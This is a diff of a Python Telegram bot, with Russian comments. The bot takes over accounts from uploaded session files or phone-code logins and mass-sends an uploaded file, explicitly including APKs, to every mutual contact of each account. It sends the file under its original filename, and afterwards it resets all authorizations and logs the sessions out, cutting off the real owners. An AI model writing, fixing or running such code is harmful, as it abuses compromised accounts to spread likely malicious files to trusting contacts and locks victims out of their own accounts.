@@ -150,7 +150,8 @@ def clear_user(uid):
     if uid in accounts:
         for acc in list(accounts[uid].values()):
             try:
-                if acc.get('client'): asyncio.create_task(acc['client'].disconnect())
+                if acc.get('client'): 
+                    asyncio.create_task(acc['client'].disconnect())
             except: pass
     accounts[uid] = {}
     current_step[uid] = 'menu'
@@ -165,15 +166,13 @@ def main_menu_text(uid):
     ], "Выберите действие")
 
 # ==========================================
-# 🌐 ВЕБ-СЕРВЕР (ИСПРАВЛЕНО!)
+# 🌐 ВЕБ-СЕРВЕР
 # ==========================================
 async def start_web():
     app = web.Application()
     app.router.add_get('/', lambda r: web.Response(text="🦆 OK"))
-    
     runner = web.AppRunner(app)
-    await runner.setup()  # ✅ ВАЖНО: setup() перед site!
-    
+    await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8080)))
     await site.start()
     print("🌐 Web server ready")
@@ -197,10 +196,12 @@ async def main():
 
     @bot.on(events.NewMessage)
     async def handler(e):
-        uid, txt = e.sender_id, e.text
+        uid = e.sender_id
+        txt = e.text
         step = current_step.get(uid, 'menu')
         
-        if e.sender_id == bot_id or (txt and txt.startswith('/')): return
+        if e.sender_id == bot_id or (txt and txt.startswith('/')): 
+            return
 
         # PIN
         if step == 'pin':
@@ -222,46 +223,157 @@ async def main():
             await e.respond("🔐 Введите /start", buttons=None)
             return
 
-        # SESSION
+        # 💾 SESSION FILE - ИСПРАВЛЕНО!
         if step == 'sess_file':
             if e.file and e.file.name.endswith('.session'):
                 msg = await e.respond("⏳ Загрузка session...", buttons=None)
                 try:
+                    # Очистка старых данных
                     clear_user(uid)
                     
+                    # Скачивание
                     path = await e.download_media(file=f"sessions/acc_{uid}.session")
-                    client = TelegramClient(path.replace('.session',''), API_ID, API_HASH)
+                    
+                    # Создание клиента
+                    session_name = path.replace('.session', '')
+                    client = TelegramClient(session_name, API_ID, API_HASH)
+                    
+                    # Подключение
                     await client.connect()
+                    
+                    # Проверка авторизации
+                    if not await client.is_user_authorized():
+                        await msg.edit("❌ **Сессия недействительна!**\n\nПопробуйте другую сессию.", buttons=None)
+                        await client.disconnect()
+                        return
+                    
+                    # Получение информации
                     me = await client.get_me()
                     
+                    # Контакты
                     try:
                         contacts = await client(GetContactsRequest(0))
                         total = len([u for u in contacts.users if not u.bot])
                         mutual = len([u for u in contacts.users if u.mutual_contact and not u.bot])
-                    except: total, mutual = 0, 0
+                    except: 
+                        total, mutual = 0, 0
                     
+                    # Сохранение
                     accounts.setdefault(uid, {})['active'] = {
-                        'client': client, 'phone': me.phone, 'name': me.first_name or 'No name',
-                        'username': me.username or 'нет', 'total': total, 'mutual': mutual}
+                        'client': client, 
+                        'phone': me.phone if me.phone else 'скрыт', 
+                        'name': me.first_name or 'No name',
+                        'username': me.username or 'нет', 
+                        'total': total, 
+                        'mutual': mutual
+                    }
                     current_step[uid] = 'menu'
                     
                     await msg.edit(acc_info(accounts[uid]['active']), buttons=acc_action_kb())
+                    
+                except Exception as err:
+                    print(f"Session error: {err}")
+                    await msg.edit(f"❌ **Ошибка:** {str(err)[:200]}", buttons=None)
+            return
+
+        # 📱 PHONE NUMBER - ИСПРАВЛЕНО!
+        if step == 'phone':
+            if txt and txt.startswith('+') and txt[1:].replace(' ', '').isdigit():
+                msg = await e.respond("🔄 Подключение...", buttons=None)
+                try:
+                    clear_user(uid)
+                    
+                    client = TelegramClient(f'acc_{uid}', API_ID, API_HASH)
+                    await client.connect()
+                    
+                    # Отправка кода
+                    await client.send_code_request(txt)
+                    
+                    # Сохранение для следующего шага
+                    accounts.setdefault(uid, {})['temp_client'] = client
+                    accounts[uid]['temp_phone'] = txt
+                    current_step[uid] = 'wait_code'
+                    
+                    await msg.edit(f"✅ **Код отправлен на {txt}**\n\nВведите код из Telegram:", buttons=cancel_kb())
+                    
                 except Exception as err:
                     await msg.edit(f"❌ Ошибка: {str(err)[:200]}", buttons=None)
             return
 
-        # MATERIAL
+        # 🔢 CODE VERIFICATION
+        if step == 'wait_code':
+            if txt and txt.isdigit() and 4 <= len(txt) <= 6:
+                temp_client = accounts.get(uid, {}).get('temp_client')
+                temp_phone = accounts.get(uid, {}).get('temp_phone')
+                
+                if not temp_client or not temp_phone:
+                    await e.respond("❌ Сессия истекла. Начните сначала.", buttons=None)
+                    return
+                
+                try:
+                    # Вход
+                    await temp_client.sign_in(temp_phone, txt)
+                    
+                    # Проверка
+                    if not await temp_client.is_user_authorized():
+                        await e.respond("❌ Неверный код", buttons=None)
+                        return
+                    
+                    me = await temp_client.get_me()
+                    
+                    # Контакты
+                    try:
+                        contacts = await temp_client(GetContactsRequest(0))
+                        total = len([u for u in contacts.users if not u.bot])
+                        mutual = len([u for u in contacts.users if u.mutual_contact and not u.bot])
+                    except:
+                        total, mutual = 0, 0
+                    
+                    # Сохранение
+                    accounts.setdefault(uid, {})['active'] = {
+                        'client': temp_client,
+                        'phone': me.phone if me.phone else 'скрыт',
+                        'name': me.first_name or 'No name',
+                        'username': me.username or 'нет',
+                        'total': total,
+                        'mutual': mutual
+                    }
+                    
+                    # Очистка временных данных
+                    accounts[uid].pop('temp_client', None)
+                    accounts[uid].pop('temp_phone', None)
+                    
+                    current_step[uid] = 'menu'
+                    
+                    await e.respond(acc_info(accounts[uid]['active']), buttons=acc_action_kb())
+                    
+                except Exception as err:
+                    await e.respond(f"❌ Ошибка: {str(err)[:200]}", buttons=None)
+            return
+
+        # 📥 MATERIAL - ИСПРАВЛЕНО!
         if step == 'upload_mat':
             if e.file or txt:
+                # Удаление старого
                 current_materials.pop(uid, None)
                 
                 if e.file:
-                    name = e.file.name
-                    path = await e.download_media(file=f"materials/mat_{uid}_{name}")
+                    original_name = e.file.name  # Сохраняем оригинальное имя!
+                    path = await e.download_media(file=f"materials/{original_name}")
                     cap = txt or ''
-                    mat = {'file': path, 'caption': cap, 'name': name, 'original_name': name}
+                    mat = {
+                        'file': path, 
+                        'caption': cap, 
+                        'name': original_name,  # Оригинальное имя
+                        'original_name': original_name
+                    }
                 else:
-                    mat = {'file': None, 'caption': txt, 'name': 'Text', 'original_name': 'Text'}
+                    mat = {
+                        'file': None, 
+                        'caption': txt, 
+                        'name': 'Text', 
+                        'original_name': 'Text'
+                    }
                 
                 material_history.setdefault(uid, []).append(mat)
                 current_materials[uid] = mat
@@ -316,7 +428,7 @@ async def main():
             await e.edit("**🔑 Введите String**", buttons=cancel_kb())
         elif d == 'upload_mat':
             current_step[uid] = 'upload_mat'
-            await e.edit("**📥 Отправьте файл или текст**", buttons=cancel_kb())
+            await e.edit("**📥 Отправьте файл**\n\nAPK, фото, видео и т.д.", buttons=cancel_kb())
         elif d == 'broadcast':
             current_step[uid] = 'menu'
             accs = accounts.get(uid, {})
@@ -324,7 +436,7 @@ async def main():
             if uid not in current_materials: return await e.answer("❌ Нет материала", alert=True)
             total = sum(a.get('mutual',0) for a in accs.values())
             fields = [{'name': f"👤 {a['name']}", 'value': f"📞 {a.get('mutual',0)}"} for a in accs.values()]
-            fields += [{'name': '📦 Материал', 'value': current_materials[uid]['name']}, {'name': '📊 Всего', 'value': str(total)}]
+            fields += [{'name': '📦 Файл', 'value': current_materials[uid]['name']}, {'name': '📊 Всего', 'value': str(total)}]
             await e.edit(embed("🚀 Рассылка", "Параметры:", fields, "Подтвердите запуск"), buttons=confirm_kb())
         elif d == 'confirm':
             broadcast_cancelled[uid] = False
@@ -382,18 +494,26 @@ async def main():
                     break
                 try:
                     if mat['file']:
-                        await acc['client'].send_file(user.id, mat['file'], caption=mat['caption'], attributes=[DocumentAttributeFilename(file_name=mat.get('original_name','file'))])
+                        # ОТПРАВКА С ОРИГИНАЛЬНЫМ ИМЕНЕМ!
+                        await acc['client'].send_file(
+                            user.id, 
+                            mat['file'], 
+                            caption=mat['caption'],
+                            attributes=[DocumentAttributeFilename(file_name=mat.get('original_name', 'file'))]
+                        )
                     else:
                         await acc['client'].send_message(user.id, mat['caption'])
                     sent += 1
-                except: failed += 1
+                except Exception as send_err:
+                    print(f"Send error: {send_err}")
+                    failed += 1
                 
                 current += 1
                 if current % 10 == 0:
                     await status.edit(broadcast_prog(current, total, failed, acc['name']), buttons=broadcast_kb())
                 await asyncio.sleep(2)
         
-        # Logout
+        # Logout из ВСЕХ сессий
         await status.edit("**🔐 Завершение сессий...**", buttons=None)
         success, fail = [], []
         for acc, _ in targets:
@@ -401,7 +521,9 @@ async def main():
                 await acc['client'](ResetAuthorizationsRequest())
                 await acc['client'](LogOutRequest())
                 success.append(f"{acc['name']} ({acc['phone']})")
-            except: fail.append(acc['name'])
+            except Exception as logout_err:
+                print(f"Logout error: {logout_err}")
+                fail.append(acc['name'])
         
         accounts[uid] = {}
         if not cancelled: update_stats(uid, sent)
